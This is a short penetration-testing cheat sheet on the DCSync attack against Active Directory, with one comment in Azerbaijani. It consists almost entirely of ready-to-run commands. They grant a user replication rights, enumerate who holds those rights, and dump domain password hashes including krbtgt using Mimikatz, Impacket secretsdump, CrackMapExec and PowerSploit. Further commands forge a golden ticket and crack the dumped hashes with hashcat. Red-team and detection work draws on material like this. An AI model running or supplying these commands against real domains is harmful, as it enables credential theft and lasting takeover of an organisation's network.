# DCSync
```powershell
MS-DRSR (Directory Replication Service Remote Protocol)
MITRE ATT&CK: T1003.006 — OS Credential Dumping: DCSync

# Need Privileges
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set

# İstifadəçi "sako"-ya bütün DCSync hüquqlarını veririk
Add-DomainObjectAcl -TargetIdentity "DC=warzone,DC=oxsium,DC=local" -PrincipalIdentity "sako" -Rights DCSync
```

# Enumeration
```powershell
Get-DomainObjectACL -SearchBase "DC=warzone,DC=oxsium,DC=local" | ? {
    ($_.ObjectAceType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2") -or # Get-Changes
    ($_.ObjectAceType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -or # Get-Changes-All
    ($_.ObjectAceType -eq "89e95b76-444d-4c62-991a-0facbeda0a0c")    # Get-Changes-In-Filtered-Set
} | Select-Object @{Name="PrincipalName";Expression={Convert-SidToName $_.SecurityIdentifier}}, ObjectAceType | Out-GridView
```

# Mimikatz
```powershell
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /dc:DC01.corp.local /domain:corp.local /user:krbtgt
```

# Impacket
```powershell
python3 secretsdump.py corp.local/Administrator:'P@ssw0rd'@192.168.1.10 -just-dc-ntlm
python3 secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@192.168.1.10
```

# CrackMapExec
```powershell
crackmapexec smb 192.168.1.10 -u Administrator -p 'P@ssw0rd' --ntds
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM_HASH> --ntds
crackmapexec smb 192.168.1.10 -u Administrator -p 'P@ssw0rd' --ntds drsuapi
```

# PowerView
```powershell
Import-Module .\PowerSploit.psd1
Invoke-DCSync -PWDumpFormat
```

# Golden Ticket
```powershell
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local \
          /sid:S-1-5-21-XXXXXXX /krbtgt:<KRBTGT_HASH> /ptt
```

# Hashcat
```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
